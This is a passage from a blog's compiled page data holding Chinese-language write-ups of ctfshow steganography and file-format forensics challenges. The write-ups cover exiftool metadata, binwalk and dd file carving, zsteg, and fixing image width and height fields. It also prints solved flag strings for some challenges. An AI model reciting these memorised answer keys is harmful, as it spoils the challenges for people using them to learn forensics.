18题的也可以用这个工具查看\r\n\r\n![image-20230529165534249](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png) \r\n\r\n### misc20\r\n\r\n> 还是用exiftool查看文件信息\r\n\r\n> 发现在comment里有文字隐写\r\n\r\n![image-20230529165555621](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png)\r\n\r\n### misc21![image-20230529165632408](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png)\r\n\r\n> 题目给出的提示是要在序号里找\r\n\r\n> 但是唯一一个serial number很显然不符合flag格式\r\n\r\n> 这时发现有四段xy信息是一串长度相同的数字\r\n\r\n> 第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了\r\n>\r\n> ![image-20230529165900646](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png)\r\n>\r\n> ![image-20230529165926034](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png)\r\n\r\n### misc22![image-20230529165931825](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png)\r\n\r\n> 这道题是先用exiftool查看文件信息\r\n\r\n> 发现最后一行有thumbnail image 代表这张图片是有缩略图的\r\n\r\n> 使用命令进行分离缩略图\r\n\r\n![image-20230529170045544](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png)\r\n\r\n> [如果不懂exiftool有啥参数能用看这](https://www.32r.com/soft/86104.html)\r\n\r\n> 另一个方法\r\n\r\n> 使用magicexif也能直接查看缩略图信息\r\n\r\n![image-20230529170140988](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png)\r\n\r\n![image-20230529170201419](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png)\r\n\r\n### misc23\r\n\r\n> 这道题涉及了时间戳隐写\r\n\r\n> 首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写\r\n\r\n![image-20230529170207389](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png)\r\n\r\n> 时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值\r\n\r\n![image-20230529170218838](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png)\r\n\r\n41\r\n\r\n![image-20230529170425260](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png)\r\n\r\n这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中\r\n\r\n属于长见识的一道题\r\n\r\n \r\n\r\n \r\n\r\n## 信息附加的总结：\r\n\r\n> 做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。\r\n\r\n>    其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。\r\n\r\n> ​\t然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。\r\n\r\n> 对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容\r\n\r\n \r\n\r\n',contentRendered:'<h1 id="misc刷题-信息附加" tabindex="-1"><a class="header-anchor" href="#misc刷题-信息附加" aria-hidden="true">#</a> misc刷题（信息附加）</h1>\n<h2 id="信息附加" tabindex="-1"><a class="header-anchor" href="#信息附加" aria-hidden="true">#</a> 信息附加</h2>\n<h3 id="misc3" tabindex="-1"><a class="header-anchor" href="#misc3" aria-hidden="true">#</a> Misc3</h3>\n<blockquote>\n<p>Bpgview.exe 的使用 当文件后缀是bpg使用</p>\n</blockquote>\n<blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" />\n</blockquote>\n<h3 id="misc5" tabindex="-1"><a class="header-anchor" href="#misc5" aria-hidden="true">#</a> misc5</h3>\n<blockquote>\n<p>图片隐写</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png" data="aurora"></p>\n</blockquote>\n<h3 id="misc6" tabindex="-1"><a class="header-anchor" href="#misc6" aria-hidden="true">#</a> misc6</h3>\n<p>同理</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png" data="aurora"></p>\n<h3 id="misc7" tabindex="-1"><a class="header-anchor" href="#misc7" aria-hidden="true">#</a> misc7</h3>\n<blockquote>\n<p>同理 不放照片了</p>\n</blockquote>\n<h3 id="misc8" tabindex="-1"><a class="header-anchor" href="#misc8" aria-hidden="true">#</a> misc8</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png" data="aurora"></p>\n<blockquote>\n<p>使用foremost分离图片</p>\n</blockquote>\n<blockquote>\n<p>方法<a href="https://blog.csdn.net/john_david_/article/details/87273152" target="_blank" rel="noopener noreferrer">foremost使用简介<ExternalLinkIcon/></a></p>\n</blockquote>\n<h3 id="misc9" tabindex="-1"><a class="header-anchor" href="#misc9" aria-hidden="true">#</a> misc9</h3>\n<blockquote>\n<p>用winhex查找</p>\n</blockquote>\n<h3 id="misc10" tabindex="-1"><a class="header-anchor" href="#misc10" aria-hidden="true">#</a> misc10</h3>\n<blockquote>\n<p>图片文件的分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png" data="aurora"><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png" data="aurora"></p>\n<blockquote>\n<p>根据提示搞 要将runas=root</p>\n</blockquote>\n<h3 id="misc11" tabindex="-1"><a class="header-anchor" href="#misc11" aria-hidden="true">#</a> misc11</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182748221" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png" data="aurora"></p>\n<blockquote>\n<p>利用tweakpng 对png文件idat（数据）对图片内容改写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182805387" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png" data="aurora"></p>\n<blockquote>\n<p>删除不同的数据块所获得的内容也不同</p>\n</blockquote>\n<h3 id="misc12" tabindex="-1"><a class="header-anchor" href="#misc12" aria-hidden="true">#</a> misc12</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182820884" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png" data="aurora"></p>\n<blockquote>\n<p>按f7预览</p>\n</blockquote>\n<blockquote>\n<p>从头逐个删除idat直至出现</p>\n</blockquote>\n<blockquote>\n<p>具体原因不清楚   idat的length应该是一样的 常规删除不一样的</p>\n</blockquote>\n<h3 id="misc13" tabindex="-1"><a class="header-anchor" href="#misc13" aria-hidden="true">#</a> misc13</h3>\n<blockquote>\n<p>抽象的题目</p>\n</blockquote>\n<blockquote>\n<p>图片用winhex打开图片 发现有类似flag的东西？</p>\n</blockquote>\n<blockquote>\n<p>然后分析一个间隔一个的出现</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182858447" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png" data="aurora"></p>\n</blockquote>\n<blockquote>\n<p>那么将十六进制转化为byte类型再用切片提取flag</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182939765" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png" data="aurora"></p>\n<h3 id="misc14" tabindex="-1"><a class="header-anchor" href="#misc14" aria-hidden="true">#</a> misc14</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182953629" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png" data="aurora"></p>\n<blockquote>\n<p>Binwalk查看整个文件的块内容</p>\n</blockquote>\n<blockquote>\n<p>可以发现发现 有四个文件块</p>\n</blockquote>\n<blockquote>\n<p>用dd命令进行分解 dd if=源文件 of=输出文件 skip=跳过的大小 count=提取文件的大小 bs=块大小 这边DECIMAL 是指的上一个文件的大小</p>\n</blockquote>\n<blockquote>\n<p>应该先查看文件的类型然后 对对应的文件进行分离</p>\n</blockquote>\n<h3 id="misc15" tabindex="-1"><a class="header-anchor" href="#misc15" aria-hidden="true">#</a> misc15</h3>\n<blockquote>\n<p>用winhex查找</p>\n</blockquote>\n<p>无图.jpg</p>\n<h3 id="misc16" tabindex="-1"><a class="header-anchor" href="#misc16" aria-hidden="true">#</a> misc16</h3>\n<blockquote>\n<p>用binwalk进行分离 得到文件夹下里面寻找</p>\n</blockquote>\n<p>再次无图.jpg</p>\n<h3 id="misc17" tabindex="-1"><a class="header-anchor" href="#misc17" aria-hidden="true">#</a> misc17</h3>\n<blockquote>\n<p>新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离</p>\n</blockquote>\n<blockquote>\n<p><a href="https://blog.csdn.net/weixin_52941926/article/details/121536324" target="_blank" rel="noopener noreferrer">zsteg使用方法<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>建议以后如果不会好好看</p>\n</blockquote>\n<blockquote>\n<p>可以先使用zsteg &lt;文件名&gt; --all 查看所有组合</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161238348" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png" data="aurora"></p>\n<blockquote>\n<p>这边发现是只有extradata:0模式下有隐藏内容</p>\n</blockquote>\n<blockquote>\n<p>所以对此进行分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161256254" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png" data="aurora"></p>\n<blockquote>\n<p>然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161300816" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png" data="aurora"></p>\n<blockquote>\n<p>然后就分离出来了</p>\n</blockquote>\n<h3 id="misc18" tabindex="-1"><a class="header-anchor" href="#misc18" aria-hidden="true">#</a> misc18</h3>\n<blockquote>\n<p>藏在详细信息里</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165153643" originSrc="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png" data="aurora"></p>\n<blockquote>\n<p>就没啥好说的，多留意就行</p>\n</blockquote>\n<h3 id="misc19" tabindex="-1"><a class="header-anchor" href="#misc19" aria-hidden="true">#</a> misc19</h3>\n<blockquote>\n<p>使用新工具exiftool查看图片的详细内容</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165312013" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png" data="aurora"></p>\n<blockquote>\n<p>使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165521755" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png" data="aurora"></p>\n<blockquote>\n<p>那么同理 18题的也可以用这个工具查看</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165534249" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png" data="aurora"></p>\n<h3 id="misc20" tabindex="-1"><a class="header-anchor" href="#misc20" aria-hidden="true">#</a> misc20</h3>\n<blockquote>\n<p>还是用exiftool查看文件信息</p>\n</blockquote>\n<blockquote>\n<p>发现在comment里有文字隐写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165555621" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png" data="aurora"></p>\n<h3 id="misc21" tabindex="-1"><a class="header-anchor" href="#misc21" aria-hidden="true">#</a> misc21<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165632408" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png" data="aurora"></h3>\n<blockquote>\n<p>题目给出的提示是要在序号里找</p>\n</blockquote>\n<blockquote>\n<p>但是唯一一个serial number很显然不符合flag格式</p>\n</blockquote>\n<blockquote>\n<p>这时发现有四段xy信息是一串长度相同的数字</p>\n</blockquote>\n<blockquote>\n<p>第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165900646" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165926034" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png" data="aurora"></p>\n</blockquote>\n<h3 id="misc22" tabindex="-1"><a class="header-anchor" href="#misc22" aria-hidden="true">#</a> misc22<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165931825" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png" data="aurora"></h3>\n<blockquote>\n<p>这道题是先用exiftool查看文件信息</p>\n</blockquote>\n<blockquote>\n<p>发现最后一行有thumbnail image 代表这张图片是有缩略图的</p>\n</blockquote>\n<blockquote>\n<p>使用命令进行分离缩略图</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170045544" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png" data="aurora"></p>\n<blockquote>\n<p><a href="https://www.32r.com/soft/86104.html" target="_blank" rel="noopener noreferrer">如果不懂exiftool有啥参数能用看这<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>另一个方法</p>\n</blockquote>\n<blockquote>\n<p>使用magicexif也能直接查看缩略图信息</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170140988" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170201419" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png" data="aurora"></p>\n<h3 id="misc23" tabindex="-1"><a class="header-anchor" href="#misc23" aria-hidden="true">#</a> misc23</h3>\n<blockquote>\n<p>这道题涉及了时间戳隐写</p>\n</blockquote>\n<blockquote>\n<p>首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170207389" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png" data="aurora"></p>\n<blockquote>\n<p>时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170218838" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png" data="aurora"></p>\n<p>41</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170425260" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png" data="aurora"></p>\n<p>这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中</p>\n<p>属于长见识的一道题</p>\n<h2 id="信息附加的总结" tabindex="-1"><a class="header-anchor" href="#信息附加的总结" aria-hidden="true">#</a> 信息附加的总结：</h2>\n<blockquote>\n<p>做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。</p>\n</blockquote>\n<blockquote>\n<p>其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。</p>\n</blockquote>\n<blockquote>\n<p>​\t然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。</p>\n</blockquote>\n<blockquote>\n<p>对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/misc1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"misc1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/misc1.md",filePathRelative:"misc/misc1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc1.html.vue",componentFilePathRelative:"pages/misc/misc1.html.vue",componentFileChunkName:"v-7c00b81e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc1.html.js",dataFilePathRelative:"pages/misc/misc1.html.js",dataFileChunkName:"v-7c00b81e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/misc1.html",htmlFilePathRelative:"misc/misc1.html"},{data:{key:"v-7db590bd",path:"/misc/misc2.html",title:"misc刷题（文件结构）",lang:"zh-CN",frontmatter:{date:"2023/5/29 17:15",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（文件结构）",tag:["ctfshow刷题"],categories:["文件结构","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件结构",slug:"文件结构",children:[{level:3,title:"misc24",slug:"misc24",children:[]},{level:3,title:"misc25",slug:"misc25",children:[]},{level:3,title:"misc26",slug:"misc26",children:[]},{level:3,title:"misc27",slug:"misc27",children:[]},{level:3,title:"misc28",slug:"misc28",children:[]},{level:3,title:"misc29",slug:"misc29",children:[]},{level:3,title:"misc30",slug:"misc30",children:[]},{level:3,title:"misc31",slug:"misc31",children:[]},{level:3,title:"misc32",slug:"misc32",children:[]},{level:3,title:"misc33",slug:"misc33",children:[]},{level:3,title:"misc34",slug:"misc34",children:[]},{level:3,title:"miscc35",slug:"miscc35",children:[]},{level:3,title:"misc36",slug:"misc36",children:[]},{level:3,title:"misc37",slug:"misc37",children:[]},{level:3,title:"misc38",slug:"misc38",children:[]},{level:3,title:"misc39",slug:"misc39",children:[]}]}],git:{}},key:"v-7db590bd",path:"/misc/misc2.html",title:"misc刷题（文件结构）",lang:"zh-CN",frontmatter:{date:"2023/5/29 17:15",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（文件结构）",tag:["ctfshow刷题"],categories:["文件结构","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件结构",slug:"文件结构",children:[{level:3,title:"misc24",slug:"misc24",children:[]},{level:3,title:"misc25",slug:"misc25",children:[]},{level:3,title:"misc26",slug:"misc26",children:[]},{level:3,title:"misc27",slug:"misc27",children:[]},{level:3,title:"misc28",slug:"misc28",children:[]},{level:3,title:"misc29",slug:"misc29",children:[]},{level:3,title:"misc30",slug:"misc30",children:[]},{level:3,title:"misc31",slug:"misc31",children:[]},{level:3,title:"misc32",slug:"misc32",children:[]},{level:3,title:"misc33",slug:"misc33",children:[]},{level:3,title:"misc34",slug:"misc34",children:[]},{level:3,title:"miscc35",slug:"miscc35",children:[]},{level:3,title:"misc36",slug:"misc36",children:[]},{level:3,title:"misc37",slug:"misc37",children:[]},{level:3,title:"misc38",slug:"misc38",children:[]},{level:3,title:"misc39",slug:"misc39",children:[]}]}],content:"\r\n## 文件结构\r\n\r\n### misc24\r\n\r\n> 考察了bmp文件头和文件体\r\n\r\n> **[bmp文件详解](https://blog.csdn.net/whl0071/article/details/126976920)**\r\n\r\n> bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg)\r\n\r\n> 注意像素是文件体的字节数/3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是**flag****在图片上面。****宽是对的，根据像素推导高，然后在位图里改，最后导出就好**\r\n\r\n### misc25\r\n\r\n> 考察png文件格式\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg)\r\n\r\n> **Png有crc校验** \r\n\r\n> 图片的[crc校验](https://so.csdn.net/so/search?q=crc校验&spm=1001.2101.3001.7020)值由从第12个字节到第28个字节的十七位字节进行crc计算得到\r\n\r\n> 所以拿到png图的题时应当先校验crc\r\n\r\n> 49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00\r\n\r\n> 这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)\r\n\r\n### misc26\r\n\r\n> Png文件同25题去跑脚本\r\n\r\n### misc27\r\n\r\n> 考点时jpg文件格式 这个参考\r\n\r\n> **[jpg文件格式](https://blog.csdn.net/weixin_40673765/article/details/118786341)**               ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif)\r\n\r\n\r\n\r\n> Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽\r\n\r\n> 当什么提示flag在下面上面就修改高 宽看题目意思修改\r\n\r\n> ***Jpg的宽高是先高后宽*** \r\n\r\n> 在第四块区域中0008 0008 是高和宽 注意要倒着看\r\n\r\n### misc28\r\n\r\n> [GIF 字节格式](https://www.jianshu.com/p/4fabac6b15b3)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif)\r\n\r\n> 474946383961 文件头后是宽高 \r\n\r\n> **注意点** 还有 Image Seperator里的下一帧宽高也需要改\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif)\r\n\r\n> 这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87\r\n\r\n> 所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改\r\n\r\n> 我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）\r\n\r\n> 这里引入stegsolve 图片查看器 \r\n\r\n### misc29\r\n\r\n> 也是gif文件格式 根据题目修改高 记得每一帧的高都要修改\r\n\r\n> 保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了 \r\n\r\n### misc30\r\n\r\n> 还是bmp图片格式 所以按照题目要求修改 宽度950 （3B6）就行 注意得倒着写\r\n\r\n### misc31\r\n\r\n> Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整\r\n\r\n### misc32\r\n\r\n> 考察了png 的crc检验 把文件放到脚本里去跑得出宽和高\r\n\r\n### misc33\r\n\r\n> 和上题一样 跑脚本\r\n\r\n### misc34\r\n\r\n> 根据提示用脚本遍历宽度就行 \r\n\r\n### miscc35\r\n\r\n> 不能理解为什么高度也会被改掉\r\n\r\n> 那么既然改了为什么高度是600\r\n\r\n> 那如果遍历高度和宽度呢\r\n\r\n> 发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件\r\n\r\n> 引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件\r\n\r\n这道题\r\n\r\n这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack('>h',i)如果像bmp是倒着写的可以[::-1]\r\n\r\n### misc36\r\n\r\n> 和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。\r\n\r\n### misc37\r\n\r\n> 打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}\r\n\r\n### misc38\r\n\r\n> 提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具[png转gif工具](https://cdkm.com/cn/png-to-gif) 然后和上一题同样操作就行了\r\n\r\nctfshow{48b722b570c603ef58cc0b83bbf7680d}\r\n\r\n> 使用apngdis.exe（APNG Disassembler）工具分离文件也可\r\n\r\n \r\n\r\n### misc39\r\n\r\n> 提示是flag如流水，图片帧间隔时间隐写，identify -format \"%T \" misc39.gif > 1.txt\r\n\r\n> 这个实在看不懂了网上找吧\r\n\r\n> flag一般是32位的加上格式是41位，\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif)\r\n\r\n> 可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0\r\n\r\n> 转化为287，287 /41=7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串",contentRendered:'<h2 id="文件结构" tabindex="-1"><a class="header-anchor" href="#文件结构" aria-hidden="true">#</a> 文件结构</h2>\n<h3 id="misc24" tabindex="-1"><a class="header-anchor" href="#misc24" aria-hidden="true">#</a> misc24</h3>\n<blockquote>\n<p>考察了bmp文件头和文件体</p>\n</blockquote>\n<blockquote>\n<p><strong><a href="https://blog.csdn.net/whl0071/article/details/126976920" target="_blank" rel="noopener noreferrer">bmp文件详解<ExternalLinkIcon/></a></strong></p>\n</blockquote>\n<blockquote>\n<p>bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg" data="aurora"></p>\n<blockquote>\n<p>注意像素是文件体的字节数/3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是**flag****在图片上面。**<strong>宽是对的，根据像素推导高，然后在位图里改，最后导出就好</strong></p>\n</blockquote>\n<h3 id="misc25" tabindex="-1"><a class="header-anchor" href="#misc25" aria-hidden="true">#</a> misc25</h3>\n<blockquote>\n<p>考察png文件格式</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg" data="aurora"></p>\n<blockquote>\n<p><strong>Png有crc校验</strong></p>\n</blockquote>\n<blockquote>\n<p>图片的<a href="https://so.csdn.net/so/search?q=crc%E6%A0%A1%E9%AA%8C&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">crc校验<ExternalLinkIcon/></a>值由从第12个字节到第28个字节的十七位字节进行crc计算得到</p>\n</blockquote>\n<blockquote>\n<p>所以拿到png图的题时应当先校验crc</p>\n</blockquote>\n<blockquote>\n<p>49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00</p>\n</blockquote>\n<blockquote>\n<p>这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)</p>\n</blockquote>\n<h3 id="misc26" tabindex="-1"><a class="header-anchor" href="#misc26" aria-hidden="true">#</a> misc26</h3>\n<blockquote>\n<p>Png文件同25题去跑脚本</p>\n</blockquote>\n<h3 id="misc27" tabindex="-1"><a class="header-anchor" href="#misc27" aria-hidden="true">#</a> 